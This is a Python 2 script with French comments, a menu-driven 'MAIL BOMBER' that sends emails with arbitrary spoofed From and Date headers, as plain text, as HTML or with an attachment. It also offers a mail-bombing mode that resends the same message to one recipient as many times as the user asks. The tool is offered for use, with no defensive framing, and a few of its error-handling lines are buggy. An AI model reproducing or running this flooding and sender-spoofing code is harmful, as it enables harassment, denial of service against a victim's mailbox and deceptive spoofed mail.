#!/usr/bin/env python
# -*-coding: utf-8-*-

import smtplib
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email.MIMEImage import MIMEImage
import mimetypes, posixpath
from email import Utils
import time

# programme destiné à envoyer de mails simples, en http, en http avec pièce jointe ou à faire du mail bombing

# l'utilisateur entre ici ses identifiants de connexion au serveur
login = ''
password = ''
port_smtp = ''


def informationsBasiques():
	# on demande à l'utilisateur des informations de base, stocke les résultats dans des variables
	
	serveur_mail = raw_input("Serveur mail : ")
	fromaddr = raw_input("From : ")
	toaddr = raw_input("To : ")
	sujet = raw_input("Sujet : ")
	date = raw_input("Date : ")

	return {
		'serveur_mail': serveur_mail,
		'fromaddr': fromaddr,
		'toaddr': toaddr,
		'sujet': sujet,
		'date': date,
	}
	

def creerMail(mail, informations):
	# fonction permettant de créer le mail

	# on défini les headers de notre mail
	print "Création du mail"
	mail['From'] = informations['fromaddr']
	mail['To'] = informations['toaddr']
	mail['Subject'] = informations['sujet']
	mail['Date'] = informations['date']
	mail['Message-ID'] = Utils.make_msgid()


def pieceJointeMail():
	# fonction renvoyant un message de type MIMEImage à partir d'un fichier

	# on demande à l'utilisateur le chemin du ficher qu'il souhaite mettre en pièce jointe
	fichier_open = None

	while not fichier_open:
		fichier = raw_input("Entrez le chemin du fichier : ")
		try:
			# on ouvre le fichier image en mode binaire
			fichier_open = open(fichier, 'rb')
		except IOError, e:
			print "Erreur : le fichier indiqué n'existe pas, %s" %s
	

	# on utilise posixpath pour avoir le nom du fichier
	nomfichier = posixpath.basename(fichier)

	# puis pour obtenir l'extension du fichier
	extension = posixpath.splitext(fichier)

	# puis mimetypes pour avoir le content-type de l'extension
	content_type = mimetypes.types_map[ extension[1] ]

	# un objet message avec le contenu du fichier
	piece_jointe = MIMEImage(fichier_open.read())

	# on ajoute les headers pour l'image
	print "Ajout de la pièce jointe"
	piece_jointe.add_header('ContentDisposition', 'attachment;filename="%s"' %nomfichier)
	piece_jointe.add_header('content-type', content_type)

	# on retourne l'objet message contenant l'image
	return piece_jointe


def connexionServeur(serveur_mail):
	# fonction permettant de se connecter au serveur

	print "Configuration du serveur SMTP"
	server = smtplib.SMTP(serveur_mail, port_smtp)

	print "Connexion au serveur"
	server.ehlo()
	server.starttls()
	server.ehlo()
	server.login(login, password)

	return server


def mailAnonyme():
	# fonction permettant d'envoyer un mail anonyme

	# on demande à l'utilisateur des informations de base
	informations = informationsBasiques()

	# on lui demande ensuite le mssage qu'il souhaite entrer
	print "Entrez votre message : "
	msg = ''
	while 1:
		line = raw_input()
		if not len(line):
			break
		msg = msg + line

	# on crée le mail
	mail = MIMEText(msg)

	# on lui ajoute les headers
	creerMail(mail, informations)

	# on se connecte au serveur
	server = connexionServeur(informations['serveur_mail'])
	
	# on envoie le mail
	print "Envoi du mail"
	server.sendmail(informations['fromaddr'], informations['toaddr'], mail.as_string())

	# on se déconnecte
	server.quit()


def mailAnonymeHTML():
	# fonction permettant d'envoyer un mail anonyme en HTML

	# on demande à l'utilisateur des informations de base
	informations = informationsBasiques()

	# on lui demande ensuite le chemin vers la page HTML qu'il souhaite envoyer
	fichierHTML = None

	while not fichierHTML :
		try:
			fichierHTML = open(raw_input("Chemin vers la page HTML : "), "r").read()
		except IOError, e:
			print "Erreur : le fichier recherché n'existe pas, %s" %e

	# on crée un objet multipart
	emailmultipart = MIMEMultipart()

	# on crée le message en html
	emailtext = MIMEText(fichierHTML, 'html')

	# on attache ce message au multipart
	emailmultipart.attach(emailtext)

	# on ajoute les headers à l'objet multipart
	creerMail(emailmultipart, informations)

	# on se connecte au serveur
	server = connexionServeur(informations['serveur_mail'])
	
	# on envoie le mail
	print "Envoi du mail"
	server.sendmail(informations['fromaddr'], informations['toaddr'], emailmultipart.as_string())

	# on se déconnecte
	server.quit()


def mailPieceJointe():
	# fonction permettant d'envoyer un mail anonyme en HTML avec pièce jointe
	# on se base sur la fonction mailAnonymeHTML, en rajoutant la pièce jointe

	# on demande à l'utilisateur des informations de base
	informations = informationsBasiques()

	# on lui demande ensuite le chemin vers la page HTML qu'il souhaite envoyer
	fichierHTML = None

	while not fichierHTML:
		try:
			fichierHTML = open(raw_input("Chemin vers la page HTML : "), "r").read()
		except IOError, e:
			print "Erreur : le fichier recherché n'existe pas, %s" %e

	# on crée un objet multipart
	emailmultipart = MIMEMultipart()

	# on crée un objet pièce jointe
	piece_jointe = pieceJointeMail()

	# on crée le message en html
	emailtext = MIMEText(fichierHTML, 'html')

	# on attache ce message au multipart
	emailmultipart.attach(emailtext)

	# on attache la pièce jointe à notre mail multipart
	emailmultipart.attach(piece_jointe)

	# on ajoute les headers à l'objet multipart
	creerMail(emailmultipart, informations)

	# on se connecte au serveur
	server = connexionServeur(informations['serveur_mail'])

	# on envoie le message
	print "Envoi du mail"
	server.sendmail(informations['fromaddr'], informations['toaddr'], emailmultipart.as_string())

	# on se déconnecte
	server.quit()


def mailBombing():
	# fonction permattant de faire du Mail Bombing
	# on crée un mail standard de la même manière que dans mailPieceJointe()

	# on demande à l'utilisateur des informations de base
	informations = informationsBasiques()

	# on lui demande ensuite le chemin vers la page HTML qu'il souhaite envoyer
	fichierHTML = None

	while not fichierHTML:
		try:
			fichierHTML = open(raw_input("Chemin vers la page HTML : "), "r").read()
		except IOError:
			print "Erreur : le fichier recherché n'existe pas %s" %e

	# on crée un objet multipart
	emailmultipart = MIMEMultipart()

	# on crée un objet pièce jointe
	piece_jointe = pieceJointeMail()

	# on crée le message en html
	emailtext = MIMEText(fichierHTML, 'html')

	# on attache ce message au multipart
	emailmultipart.attach(emailtext)

	# on attache la pièce jointe à notre mail multipart
	emailmultipart.attach(piece_jointe)

	# on ajoute les headers à l'objet multipart
	creerMail(emailmultipart, informations)

	# on se connecte au serveur
	server = connexionServeur(informations['serveur_mail'])

	# on envoie le mail autant de fois qu'on l'a spécifié
	for i in range(0, int(raw_input("Nombre de mails : "))):
		print "Envoi du mail : %s" %(i+1)
		server.sendmail(informations['fromaddr'], informations['toaddr'], emailmultipart.as_string())

	# on se déconnecte
	server.quit()


def menu():
	# on affiche un message de bienvenu
	print "\n"
	print "*********************"
	print "*                   *"
	print "*    MAIL BOMBER    *"
	print "*     BY E-DAHO     *"
	print "*                   *"
	print "*********************"
	print "\n"

	# on affiche à l'utilisateur les options possibles
	print "[+] 1 - Envoyer un simple mail anonyme"
	print "[+] 2 - Envoyer un mail anonyme en HTML"
	print "[+] 3 - Envoyer un mail anonyme en HTML avec piece jointe"
	print "[+] 4 - Mail Bombing"
	print "\n"

	# on récupère son choix, et on exécute une fonction différente en fonction du choix de l'utilisateur
	while 1:
		choix = raw_input("Choisissez un mode : ")
		
		try:
			choix = int(choix)
			assert choix > 0 and choix < 5
		
		except AssertionError:
			print "Erreur : le mode choisi doit être compris entre 1 et 4"
		
		except:
			print "Veuillez entrer un choix correct svp"
		
		else:
			if choix == 1:
				mailAnonyme()
			elif choix == 2:
				mailAnonymeHTML()
			elif choix == 3:
				mailPieceJointe()
			else:
				mailBombing()


if __name__ == "__main__":
	menu()